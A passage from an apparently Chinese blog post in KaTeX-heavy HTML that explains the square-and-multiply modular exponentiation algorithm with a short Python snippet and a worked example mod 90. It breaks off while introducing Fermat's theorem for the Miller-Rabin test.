需要将指数转化为二进制。然后的操作类似于将二进制数转化为十进制数的过程。</p><p>比如51的二进制数<code>110011</code>。如何将二进制转化回十进制呢？</p><ol><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>∗</mo><msup><mn>2</mn><mn>0</mn></msup><mo>+</mo><mn>1</mn><mo>∗</mo><msup><mn>2</mn><mn>1</mn></msup><mo>+</mo><mn>1</mn><mo>∗</mo><msup><mn>2</mn><mn>4</mn></msup><mo>+</mo><mn>1</mn><mo>∗</mo><msup><mn>2</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">1*2^0+1*2^1+1*2^4+1*2^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mn>1</mn><mo>∗</mo><mn>2</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>2</mn><mo>∗</mo><mn>2</mn><mo>∗</mo><mn>2</mn><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>2</mn><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">(((1*2)+1)*2*2*2+1)*2+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p>第二种方法实际上的从最左端出发</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span></span></span></span>-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>11</mn></mrow><annotation encoding="application/x-tex">11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>110</mn></mrow><annotation encoding="application/x-tex">110</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1100</mn></mrow><annotation encoding="application/x-tex">1100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>11000</mn></mrow><annotation encoding="application/x-tex">11000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span></span></span></span>-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>11001</mn></mrow><annotation encoding="application/x-tex">11001</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>110010</mn></mrow><annotation encoding="application/x-tex">110010</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span></span></span></span>-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>110011</mn></mrow><annotation encoding="application/x-tex">110011</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span></span></span></span></p><p>每次的乘二相当于整体左移，如果对应的二进制为1，则加上1。如果对应二进制为0，那就是不加1，只乘二右移。</p><p>一系列操作后从最高位的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>得到了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>110011</mn></mrow><annotation encoding="application/x-tex">110011</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span></span></span></span>，也就完成了从1计算得到51的过程。</p></li></ol><p>平方乘算法就利用了上面的第二种方法，只不过算法中的二进制因为是在指数上，所以乘2就是平方，加一就是乘一个底数。</p><p>算法如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">bottom = <span class="hljs-number">113535859035722866</span><br>exp = <span class="hljs-number">116402471153538991</span><br>modu = <span class="hljs-number">211463707796206571</span><br><br>bin_ = <span class="hljs-built_in">bin</span>(exp)[<span class="hljs-number">2</span>:]<br>z = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> bin_:<br>    z = z ** <span class="hljs-number">2</span> % modu<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;1&quot;</span>:<br>        z = z * bottom % modu<br><span class="hljs-built_in">print</span>(z)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20211012232705453.png" alt="结果" /></p><p>结果秒出，我们很快得到了例子2中没有得到的结果。</p><p>能否用上面说的将二进制转化为十进制方法中的第一种方法来实现平方乘算法呢？我试了一下，很难。但是有一个奇怪的现象，刘杨教我们用快速指数算法手算的时候，用的都是第一种方法，ppt如下。</p><p><img src="https://upyun.wuuconix.link/image-20211012234445605.png" alt="ppt" /></p><p>ppt中的实际和平方乘算法的过程完全不一样，平方乘算法不用刻意的去就求出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>7</mn><msup><mn>9</mn><msup><mn>2</mn><mn>5</mn></msup></msup><mo separator="true">,</mo><mn>7</mn><msup><mn>9</mn><msup><mn>2</mn><mn>4</mn></msup></msup><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">79^{2^5},79^{2^4}...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.18136em;vertical-align:-0.19444em;"></span><span class="mord">7</span><span class="mord"><span class="mord">9</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9869199999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span><span class="mord"><span class="mord">9</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9869199999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span>的值，而在一次次平方与乘中自然而然得到了最终的答案。</p><p>我们用真正的平方乘算法来写一下过程。</p><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>51</mn><mo>=</mo><mo stretchy="false">(</mo><mn>110011</mn><msub><mo stretchy="false">)</mo><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">51=(110011)_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li>初始值为1</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>1</mn><mn>2</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>90</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1^2\ mod\ 90=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>   <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>∗</mo><mn>79</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>90</mn><mo>=</mo><mn>79</mn></mrow><annotation encoding="application/x-tex">1*79\ mod\ 90=79</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord">9</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord">9</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>7</mn><msup><mn>9</mn><mn>2</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>90</mn><mo>=</mo><mn>31</mn></mrow><annotation encoding="application/x-tex">79^2\ mod\ 90=31</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord"><span class="mord">9</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">1</span></span></span></span>     <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>31</mn><mo>∗</mo><mn>79</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>90</mn><mo>=</mo><mn>19</mn></mrow><annotation encoding="application/x-tex">31*79\ mod\ 90=19</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord">9</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">9</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><msup><mn>9</mn><mn>2</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>90</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">19^2\ mod\ 90=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">9</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>1</mn><mn>2</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>90</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1^2 \ mod\ 90=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>1</mn><mn>2</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>90</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1^2\ mod\ 90=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>   <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>∗</mo><mn>79</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>90</mn><mo>=</mo><mn>79</mn></mrow><annotation encoding="application/x-tex">1*79\ mod\ 90=79</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord">9</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord">9</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>7</mn><msup><mn>9</mn><mn>2</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>90</mn><mo>=</mo><mn>31</mn></mrow><annotation encoding="application/x-tex">79^2\ mod\ 90=31</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord"><span class="mord">9</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">1</span></span></span></span>     <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>31</mn><mo>∗</mo><mn>79</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>90</mn><mo>=</mo><mn>19</mn></mrow><annotation encoding="application/x-tex">31*79\ mod\ 90=19</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord">9</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">9</span></span></span></span></li></ul><p>可以看到手动算的时候，我们也可以直接利用算法原本的过程，计算量比ppt更小。</p><p>但是也许ppt上的方法更容易让人理解，但是程序是较难实现的。</p><h3 id="miller-rabin-algorithm-fermat-test"><a class="markdownIt-Anchor" href="#miller-rabin-algorithm-fermat-test"></a> Miller-Rabin Algorithm (Fermat Test)</h3><p>费马测试的原理是费马定理。</p><blockquote><p>费马定理：对于素数p，取与p互素的a（0&lt;a&lt;p）。有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>a</mi><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mn>1</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^{p-1}=1\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span></span></span></span>。</p><p>费马定理实际上就是欧拉公式当n为素数时的的特例。</p><p>欧拉公式：若a与n互素，则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>a</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>=</mo><mn>1</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">a^{\varphi(n)}=1\ mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8879999999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">φ</span><span class="mopen 